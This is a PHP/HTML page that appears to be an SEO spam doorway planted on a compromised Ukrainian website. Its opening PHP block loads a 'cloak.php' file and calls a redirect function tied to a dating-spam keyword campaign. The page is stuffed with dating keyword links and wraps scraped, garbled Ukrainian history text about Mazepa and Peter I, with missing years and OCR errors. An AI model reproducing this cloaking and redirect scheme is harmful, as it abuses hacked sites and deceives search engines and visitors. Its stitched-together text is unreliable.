<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b0%d1%80%d0%b0%d0%b1%d1%81%d1%8c%d0%ba%d1%96+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%b2+%d0%9e%d1%85%d1%82%d0%b8%d1%80%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Cервісний центр МВС України в м. Охтирка</title>
	<meta name="description" content="Охтирка була одним з п'яти полкових міст Слобідської України. Місто є адміністративним, промисловим, духовним, культурним та історичним центром" />
	<link rel="canonical" href="https://masage.od.ua/img/248/neni-arabsk-znayomstva-v.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/352/fi-bezkoshtovne-pdklyuchennya-poruch.php">безкоштовне підключення поруч Каховка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/qijo-pdklyuchiti-sayt-poblizu.php">підключити сайт поблизу Красноперекопськ (Яни Капу) Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/468/vuvi-zrl-znayomstva.php">зрілі знайомства Горішні Плавні Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/377/vuker-veb-sayt-pdklyuchennya.php">веб-сайт підключення Рені Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/237/ron-sluzhba-znayomstv-v.php">Служба знайомств в Херсон Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Арабські знайомства в Охтирка Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Не забуває він і про власні інтереси.</p><a id='m1'></a><h3>Навігаційне меню</h3><p>Завдяки щедрим дарам від царя Мазепа накопичує близько 20 тис. маєтків і стає одним із найбагатших феодалів Європи. Людина досвідчена й витончена. Мазепа скеровує значну частину своїх особистих прибут? ків на розвиток релігії та культурних установ.</p>
		
	<p>Ревний покровитель православ'я, і він будує по всій Гетьманщині цілу низку чудових церков, споруджених у пишноту стилі, що його часом називають мазепинським, або козацьким, барокко. За Мазепиного гетьманування Києво-Могилянська академія змогла завдяки його підтримці спорудити нові корпуси і збільшити до 2 тис. кількість студентів.</p>
<p>Крім того, він заснував багато інших шкіл і друкарень, щоб «українська молодь могла в повну міру своїх можливостей користуватися благами освіти». Проте якщо київські спудеї та духовенство складали на його честь захоплені панегірики, то селяни й козацька чернь мало що доброго могли сказати про нього. Його відкрита й послідовна підтримка старшини збуджувала повсюдне невдоволення серед народних мас та настроєних проти старшини запорожців. Потенційно вибухова ситуація виникла у р.. коли Петро Іваненко-Петрик. писар, котрий мав широкі політичні зв'язки, втік на Січ і став піднімати там заколот проти гетьмана.</p>
<p>Оголосивши, що настав час повстати проти старшини, яка «смокче народну кров  і «визволити нашу батьківщину Україну з-під влади Москви», Петрик у своїх намаганнях утворити незалежне Українське князівство заручається підтримкою кримських татар. Проте коли замість допомоги татари повернули проти нього й стали грабувати населення, популярність Петрика серед народу похитнулася й повстання згасло. Взаємини з Росією. Гідне подиву піднесення Мазепи від в'язня до гетьмана, його здатність тримати в покорі ненаситну й підступну старшину водночас із проведенням політики, що поклала початок добі бурхливого культурного та економічного розвитку.</p>
<p>Та найбільш вражаюча риса Мазепи як політика полягала в умінні захищати як власні, так і загальноукраїнські інтереси, зберігаючи водночас добрі стосунки з Москвою. Коли в р. на трон зійшов молодий і енергійний Петро І. гетьман уже вкотре застосував свій незбагненний дар чарувати можновладців.</p><a id='m2'></a><h3></h3><p>Він надавав царю активну допомогу в грандіозних походах на турків і татар, кульмінацією яких стало здобуття у р. Азова - ключової турецької фортеці на Азовському морі. Старіючий гетьман також постійно давав недосвідченому молодому монархові поради у польських справах: згодом між ними виникла тісна особиста дружба. Козацькі полковники із сарказмом зауважували, що «цар скоріше не повірить ангелові, ніж Мазепі», а російські урядники заявляли.</p><strong><a id='m3'></a><h2>Україна за часів Петра І</h2></strong><p>що «ніколи ще не було гетьмана кориснішого і вигіднішого для царя. Як Іван Степанович Мазепа». Завдяки близьким стосункам із Петром 1 Мазепа зміг скористатися великим козацьким повстанням, що вибухнуло на підлеглому полякам Правобережжі у р. Після того як цей район знову було заселено, польська шляхта спробувала вигнати звідти козаків.</p>
<p>Правобережне козацтво на чолі з популярним у народі полковником Семеном Палієм підняло повстання: перелякані польські урядники повідомляли, що Палій хоче «піти слідами Хмельницького». Сили повстанців уже налічували 12 тис. коли до них приєдналися інші козацькі ватажки - Самійло Самусь. Захар Іскра. Андрііі Абазин. Незабаром перед повстанцями впали такі польські твердині, як Немирів. Беріичів та Біла Церква.</p><img src="https://obyava.ua/img/classified/0/148/8049/200-fom6mjtsoa18kj4x.jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>З утечею на захід польської шляхти. Отже було на те. що розгортається щось на зразок меншого варіанту року. Однак полякам удалося відвоювати значну частину втрачених земель і взяти Палія в облогу в його «столиці» Фастові. Саме в цей час у Польщу вторгається найбільший ворог Петра І - король Швеції Карп XII. Скориставшися замішанням. Мазепа переконує царя дозволити йому окупувати Правобережжя. Знову обидві частини Наддніпрянської України були об'єднані, і заслугу здійснення цього міг приписати собі Мазепа.</p>
<p>Щоб гарантувати себе від загрози з боку популярного в народі Палія. Мазепа за згодою Петра 1 наказує заарештувати того й заслати до Сибіру. Проте на початку XVIII ст. у взаємовигідних стосунках із царем, що їх Мазепа так спритно підтримував, з'являється напруженість.</p>
		
			
				<div>Вбивство місцевого жителя на Сумщині - слідчі Полтавського ТУ ДБР затримали нацгвардійця</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/TAl0qlDhPXw' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>вибухнула велика Північна війна. У виснажливііі річній боротьбі за володіння узбережжям Балтійського моря головними супротивниками виступали російський цар Петро І річний король Швеції Карп XII - обдарований полководець, але кепський політик. Зазнавши ряду катастрофічних поразок на початку війни, Петро 1, цей палкий прихильник західних звичаїв, вирішує модернізувати армію, управління й суспільство взагалі.</p>
<p>Значно зміцнювалася централізована влада, пильніше контролювалися всі ділянки життя, відмінялися також «застарілі звичаї». В межах цієї політики під загрозу потрапляла гарантована у р. традиційна автономія Гетьманщини. Під час війни цар висунув перед українцями нечувані раніше вимоги. Козаки вперше повинні були воювати виключно за інтереси царя. Замість того щоб захищати свою землю від безпосередніх ворогів - поляків, татар і турків, українці були тепер змушені битися зі шведськими арміями у далекій Лівонії, Литві чи Центральній Польщі.</p>
<p>У цих походах стало до болю очевидним те, що козаки не могли рівнятися з регулярними європейськими арміями. Коли, намагаючись узгодити дії своїх військ, Петро 1 поставив на чолі козацьких полків російських і німецьких командирів, моральний дух козаків занепав. Чужоземні офіцери ставилися з презирством до козацького війська, яке вважали гіршим і часто використовували просто як гарматне м'ясо.</p>
		
			<br><ul>
			
				<li>сайти знайомств місто поблизу Василівка Україна.</li>
			
				<li>Охтирка — Вікіпедія.</li>
			
				<li>Служба знайомств в Гребінка Україна.</li>
			
			</ul>
		
	<p>Коли поповзли чутки про наміри Петра І реорганізувати козаків, старшина, положення якої було пов'язане з військовими посадами, занепокоїлася. Війна викликала ремствування також серед українських селян і міщан. Вони скаржилися, що в їхніх містах і селах розмістилися російські війська, які завдавали утисків місцевому населенню. Навіть гетьман став відчувати загрозу, коли пішли поголоси про наміри царя замінити його чужоземним генералом чи російським вельможею.</p>
<p>Невдоволення, що врешті штовхнуло Мазепу шукати іншого покровителя, було пов'язане з питанням захисту України. Коли польський союзник Карла XII Станіслав Лещинський став погрожувати нападом на країну, Мазепа звернувся по допомогу до Петра 1. Цар, чекаючи наступу шведів, відповів: «Я не можу дати навіть десяти чоловік; боронися, як знаєш». Це було для гетьмана останньою краплею. Петро І порушив зобов'язання обороняти Україну від ненависних поляків, що являло собою основу угоди р. За ним пішло близько З тис.</p>
<p>козаків і провідних членів старшини. Умови, за яких українці приєдналися до Карла, були встановлені у пакті, підписаному наступної весни.</p><strong><a id='m4'></a><h2>Україна за часів Петра І – </h2></strong><p>За надання військової допомоги та провізії Карл обіцяв захищати Україну й утримуватися від підписання миру з царем аж до повного звільнення її від влади Москви та відновлення її давніх прав. Петро І дізнався про «вчинок нового Іуди Мазепи з великим здивуванням». Через кілька днів після переходу Мазепи до шведів на гетьманову столицю Батурин напав командуючий російськими військами на Україні князь Меншиков і вирізав усіх жителів: 6 тис. чоловіків, жінок і дітей. Звістка про бойню в Батурині й терор, що його розпочали на Україні російські війська, заарештовуючи й страчуючи за найменшою підозрою в симпатіях до Мазепи, змінила плани багатьох із потенційних прибічників гетьмана.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/406/cixe-znayomstva-bl-v.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/468/luk-pravo-znayomstv-karlvka.php">право знайомств Карлівка Україна</a></li><li><a href="https://masage.od.ua/img/248/nexo-tse.php">- це нові чорні побачення поблизу Пятихатки Україна</a></li><li><a href="https://masage.od.ua/img/422/pyd-znayomstva-v-ochakv.php">знайомства в Очаків Україна</a></li><li><a href="https://masage.od.ua/img/291/sec-zahdniy-gachok-svtlodarsk.php">західний гачок Світлодарськ Україна</a></li><li><a href="https://masage.od.ua/img/428/ra-agentstva-svata.php">агентства свата Коростень Україна</a></li><li><a href="https://masage.od.ua/img/352/zuk-znayomstva-z.php">знайомства з хлопцем з Феодосія Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#m1'>Навігаційне меню</a></li>
<li><a href='#m2'></a></li>
<li><a href='#m3'>Україна за часів Петра І</a></li>
<li><a href='#m4'>Україна за часів Петра І – </a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/467/tucu-pobachennya-znovu.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>